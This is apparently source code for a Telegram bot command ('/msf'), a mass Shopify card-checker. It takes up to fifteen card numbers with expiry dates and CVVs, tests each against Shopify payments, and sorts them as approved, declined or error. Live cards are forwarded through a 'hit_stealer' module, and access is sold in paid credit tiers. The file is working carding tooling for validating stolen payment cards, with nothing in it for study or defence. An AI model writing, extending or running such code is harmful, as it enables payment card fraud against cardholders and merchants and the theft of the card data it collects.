from pyrogram import Client, filters
import re, time, asyncio
from plugins.func.users_sql import *
from plugins.gates.func.mass_shopify_func import shopify_func
from plugins.tools.hit_stealer import send_hit_if_approved
from datetime import date
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

@Client.on_message(filters.command("msf", prefixes=["/", "."]))
async def cmd_msf(Client, message):
    try:
        user_id = str(message.from_user.id)
        user_name = message.from_user.first_name
        username = message.from_user.username or "None"
        chat_id = message.chat.id
        chat_type = str(message.chat.type)

        reg = fetchinfo(user_id)
        if not reg:
            insert_reg_data(user_id, username, 0, str(date.today()))
            reg = fetchinfo(user_id)

        role = reg[2] or "FREE"
        credit = int(reg[5] or 0)
        wait_time = int(reg[6]) if reg[6] not in [None, ""] else (15 if role == "FREE" else 5)
        antispam_time = int(reg[7] or 0)
        now = int(time.time())

        GROUP = open("plugins/group.txt").read().splitlines()
        if chat_type == "ChatType.PRIVATE" and role == "FREE":
            return await message.reply_text(
                "Premium Users Required ⚠️\n"
                "Error : Only Premium Users are Allowed to use bot in Personal.\n\n"
                "Although You Can Use Bot Free Here : Join Group\n"
                "━━━━━━━━━━━━━\n"
                "Buy Premium Plan Using /buy to Continue",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]]
                ),
                disable_web_page_preview=True
            )

        if chat_type in ["ChatType.GROUP", "ChatType.SUPERGROUP"] and str(chat_id) not in GROUP:
            return await message.reply_text("Unauthorized chat.", message.id)

        if credit < 1:
            return await message.reply_text("❌ Insufficient credit.", message.id)

        if now - antispam_time < wait_time:
            return await message.reply_text(f"⏳ AntiSpam: wait {wait_time - (now - antispam_time)}s", message.id)

        raw_text = message.reply_to_message.text if message.reply_to_message and message.reply_to_message.text else message.text
        if not raw_text:
            return await message.reply_text("❌ No card input found.", message.id)

        raw = raw_text.replace("/msf", "").strip().split("\n")
        cards = []
        for x in raw:
            nums = re.findall(r"\d+", x)
            if len(nums) >= 4:
                cards.append([nums[0], nums[1], nums[2], nums[3]])

        if not cards:
            return await message.reply_text("❌ No valid cards provided.", message.id)
        if role == "FREE" and len(cards) > 5:
            return await message.reply_text("Free users can only check 5 cards.", message.id)
        if role == "PREMIUM" and len(cards) > 15:
            return await message.reply_text("Premium users can only check 15 cards.", message.id)

        updatedata(user_id, "antispam_time", now)
        start_time = time.time()
        stmsg = await message.reply("Please wait...⌛")

        text = f"<b>BARRY | M-Shopify 0.80$</b>\nLimit: {len(cards)}/15\n━━━━━━━━━━━━━\n"
        live, dec, err = 0, 0, 0

        for i, c in enumerate(cards, 1):
            cc = f"{c[0]}|{c[1]}|{c[2]}|{c[3]}"
            res = await shopify_func(None, c[0], c[3], c[1], c[2])
            msg = res.get("response", "No response").upper()
            status = res.get("status", "").upper()
            msg_lower = msg.lower()

            if "3ds" in msg_lower or "authentication" in msg_lower:
                status_text = "Declined ❌"
                msg = "3DS Auth Required"
                dec += 1
            elif "error" in msg_lower or "failed" in msg_lower or "500" in msg_lower:
                status_text = "Error ❗"
                err += 1
            elif any(x in msg_lower for x in ["incorrect_zip", "incorrect_cvc", "cvc mismatch", "insufficient"]):
                status_text = "Approved ✅"
                live += 1
            elif "approved" in status.lower():
                status_text = "Approved ✅"
                live += 1
                await send_hit_if_approved(Client, f"<b>Live Hit (MSF)</b>\n<code>{cc}</code>\n<b>Response:</b> {msg}")
            else:
                status_text = "Declined ❌"
                dec += 1

            text += f"<b>⊙ Card:</b> <code>{cc}</code>\n<b>⊙ Status:</b> {status_text}\n<b>⊙ Result:</b> {msg}\n━━━━━━━━━━━━━\n"
            await Client.edit_message_text(chat_id, stmsg.id, text)
            await asyncio.sleep(1)

        elapsed = round(time.time() - start_time, 2)
        summary = f"[✓] Approved: {live}  |  [✘] Declined: {dec}  |  [!] Error: {err}"
        dev = '<a href="tg://user?id=6440962840">𝑩𝑨𝑹𝑹𝒀</a>'
        text += f"{summary}\n<b>ϟ T/t:</b> {elapsed}s | P/x: [Live ⛅]\n"
        text += f"<b>ϟ Checked By:</b> {user_name} [ {role} ]\n<b>⌥ Dev:</b> {dev}"

        await Client.edit_message_text(chat_id, stmsg.id, text)
        updatedata(user_id, "credits", credit - len(cards))

    except Exception as e:
        await message.reply_text(f"❌ MSF Gate Failed:\n<code>{str(e)}</code>")
